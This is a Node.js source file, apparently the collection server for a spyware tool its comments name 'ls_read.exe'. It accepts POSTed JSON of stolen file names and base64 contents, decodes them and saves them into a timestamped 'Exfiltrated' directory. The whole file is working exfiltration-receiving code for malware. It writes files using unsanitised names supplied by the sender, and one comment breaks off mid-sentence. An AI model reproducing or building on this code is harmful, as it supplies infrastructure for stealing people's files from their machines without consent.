const fs = require("fs");
const path = require("path");
const { getTimestamp } = require("../util.js");
const logging = require("../logging.js");

/**
 * The POST function for ls_read.exe spyware.
 * This takes in the request JSON and "downloads the file" in ../Exfiltrated/
 */
module.exports = function(request) 
{
    logging.log("Executing ls_read POST function");

    // Let's first declare the directory path we want to write to. If it does not exist, create said path.
    // Originally, I thought fs.mkdirSync with recursive:true would do it. However, I'm getting stupid ENOENT errors that the internet has no solutions for.
    // My theory is that recursive:true starts off at the root directory and attempts to modify that (which, of course it can't since we didn't grant it permission to do that)
    // Hence, e
    const dir_path = path.join(`./Exfiltrated`, `${getTimestamp()} ls_read/`).replace(/\:/gmi, "-");
    fs.mkdirSync(dir_path, {
        recursive: true
    });

    /**
     * @type {JSON}
     */
    let reqJSON = JSON.parse(request.body);
    
    // Loop through all file names and contents returned in the ls_read JSON. Then, it writes the file inside dir_path
    Object.entries(reqJSON).forEach((jsonEntry) => {
        const [fileName, fileBase64] = jsonEntry;
        
        // The file contents are in base64. Convert that back to UTF-8.
        // In JS, you need to convert the base64 into a binary buffer, and then re-encode it in UTF-8
        let fileContent = Buffer.from(fileBase64, 'base64').toString("utf-8");

        // might need to write w/ buffer lowkey
        let filePath = path.resolve(dir_path, fileName);
        fs.writeFileSync(filePath, fileContent);

        logging.log(`Copied file ${fileName} into ${filePath}.`);
    });
}